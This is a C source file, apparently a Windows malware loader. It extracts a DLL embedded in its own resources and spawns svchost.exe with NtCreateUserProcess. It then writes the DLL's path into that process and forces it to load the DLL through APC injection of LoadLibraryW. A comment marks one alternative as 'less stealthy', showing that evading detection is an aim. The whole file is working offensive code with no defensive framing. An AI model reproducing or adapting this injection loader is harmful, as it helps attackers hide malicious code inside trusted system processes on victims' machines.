#include "apc.h"
#include <stdio.h>
#include <tlhelp32.h>
#include <string.h>
#include <stdlib.h>
#include <tchar.h>
#define IDR_DLL2 102

void ExtractEmbeddedDLL() {
	HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_DLL2), RT_RCDATA);
	if (hRes == NULL) { printf("Failed to find DLL resource.\n"); return; }

	DWORD dwSize = SizeofResource(NULL, hRes);
	if (dwSize == 0) { printf("Failed to get size of DLL resource.\n"); return; }

	HGLOBAL hGlobal = LoadResource(NULL, hRes);
	if (hGlobal == NULL) { printf("Failed to load DLL resource.\n"); return; }

	void* pData = LockResource(hGlobal);
	if (pData == NULL) { printf("Failed to lock resource.\n"); return; }

	FILE* file = NULL;
	errno_t err = fopen_s(&file, "extracted.dll", "wb");
	if (err != 0) { printf("Failed to create output file.\n"); return; }

	fwrite(pData, 1, dwSize, file); fclose(file); printf("DLL extracted to 'extracted.dll'\n");
}


int main() {
	PVOID pAddress = NULL;
	SIZE_T sNumberOfBytesWritten = 0;
	DWORD dwOldProtection = NULL;
	printf("\n");
	ExtractEmbeddedDLL();

	if (!InitNtFunctions()) { printf("Failed to resolve NT functions.\n"); return 1; }

	char fullDllPathA[MAX_PATH];
	DWORD pathLen = GetFullPathNameA("extracted.dll", MAX_PATH, fullDllPathA, NULL);
	if (pathLen == 0) { printf("GetFullPath FAIL: %d\n", GetLastError()); return 1; }
	wchar_t fullDllPathW[MAX_PATH];
	MultiByteToWideChar(CP_ACP, 0, fullDllPathA, -1, fullDllPathW, MAX_PATH);
	SIZE_T pathSize = (wcslen(fullDllPathW) + 1) * sizeof(wchar_t);  // FIXED!




	UNICODE_STRING NtPath;
	UNICODE_STRING Win32Path;
	UNICODE_STRING Desktop;
	RtlInitUnicodeString(&NtPath, L"\\SystemRoot\\System32\\svchost.exe");
	RtlInitUnicodeString(&Win32Path, L"C:\\Windows\\System32\\svchost.exe");
	RtlInitUnicodeString(&Desktop, L"Winsta0\\Default");

	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
	NTSTATUS paramStatus = RtlCreateProcessParametersEx(&ProcessParameters, &Win32Path, NULL, NULL,
		&Win32Path, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);
	if (!NT_SUCCESS(paramStatus)) { printf("RtlCreateProcessParametersEx failed\n"); return 1; }





	// userproc version
	PS_CREATE_INFO CreateInfo = { 0 };
	CreateInfo.Size = sizeof(CreateInfo);
	CreateInfo.State = PsCreateInitialState;
	PPS_ATTRIBUTE_LIST AttributeList = (PPS_ATTRIBUTE_LIST)calloc(1, sizeof(PS_ATTRIBUTE_LIST));
	if (!AttributeList) return 1;
	AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);
	AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
	AttributeList->Attributes[0].Size = NtPath.Length;
	AttributeList->Attributes[0].Value = (ULONG_PTR)NtPath.Buffer;

	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	NTSTATUS status = NtCreateUserProcess(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
		NULL, NULL, 0, 0, ProcessParameters, &CreateInfo, AttributeList);
	if (status != STATUS_SUCCESS) { PRINTXD("NtCreateUserProcess", status); free(AttributeList); return 1; }
	DWORD pid = GetProcessId(hProcess);



	/* // Rtl version (less stealthy)
	RTL_USER_PROCESS_INFORMATION ProcessInfo = { 0 };
	ProcessInfo.Length = sizeof(RTL_USER_PROCESS_INFORMATION);
	status = RtlCreateUserProcess(&NtPath,OBJ_CASE_INSENSITIVE,ProcessParameters,NULL, NULL,
		NULL,FALSE,NULL, NULL,&ProcessInfo);

	if (!NT_SUCCESS(status)) {printf("[-] RtlCreateUserProcess failed: 0x%lx\n", status);return 1; }
	HANDLE hProcess = ProcessInfo.ProcessHandle;
	HANDLE hThread = ProcessInfo.ThreadHandle;
	DWORD pid = (DWORD)(ULONG_PTR)ProcessInfo.ClientId.UniqueProcess;
	*/



	SIZE_T originalStringSize = (wcslen(fullDllPathW) + 1) * sizeof(wchar_t);
	SIZE_T regionSize = originalStringSize; // This one will be modified by the kernel
	status = NtAllocateVirtualMemory(hProcess, &pAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (status != STATUS_SUCCESS) {
		PRINTXD("NtAllocateVirtualMemory", status); NtClose(hProcess); return;
	} else printf("Memory At : 0x%p \n", pAddress);

	status = NtWriteVirtualMemory(hProcess, pAddress, fullDllPathW, originalStringSize, NULL);
	if (status != STATUS_SUCCESS) {
		PRINTXD("NtWriteVirtualMemory", status);
		NtFreeVirtualMemory(hProcess, &pAddress, &pathSize, MEM_RELEASE); NtClose(hProcess); return;
	}

	status = NtProtectVirtualMemory(hProcess, &pAddress, &pathSize, PAGE_EXECUTE_READ, &dwOldProtection);
	if (STATUS_SUCCESS != status) {
		PRINTXD("NtProtectVirtualMemory", status);
		NtFreeVirtualMemory(hProcess, &pAddress, &pathSize, MEM_RELEASE); NtClose(hProcess); return;
	}

	HMODULE kernel32Base = GetModuleHandleW(L"kernel32.dll");
	FARPROC loadLibAdd = GetProcAddress(kernel32Base, "LoadLibraryW");
	if (loadLibAdd == NULL) { printf("Failed to get address of LoadLibraryA. Error code: %lu\n", GetLastError()); return; }

	NtAPCinject(hThread, pAddress, loadLibAdd);
	Sleep(5000); NtClose(hProcess); NtClose(hThread); free(AttributeList); printf(" end"); return 0;
}

